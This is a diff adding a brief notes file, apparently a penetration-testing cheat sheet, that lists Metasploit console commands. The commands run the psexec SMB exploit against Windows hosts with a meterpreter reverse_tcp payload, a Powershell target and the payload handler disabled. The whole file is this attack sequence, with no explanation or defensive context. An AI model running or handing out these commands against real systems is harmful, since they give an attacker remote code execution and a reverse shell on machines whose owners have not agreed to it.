@@ -1,0 +1,12 @@
+psexec
+----------
+use exploit/windows/smb/psexec
+set payload windows/x64/meterpreter/reverse_tcp
+#set payload windows/meterpreter/reverse_tcp
+set lhost <>
+set lport <>
+set target Powershell
+#set target Native\ upload
+set DisablePayloadHandler True
+run
+++++++++++   
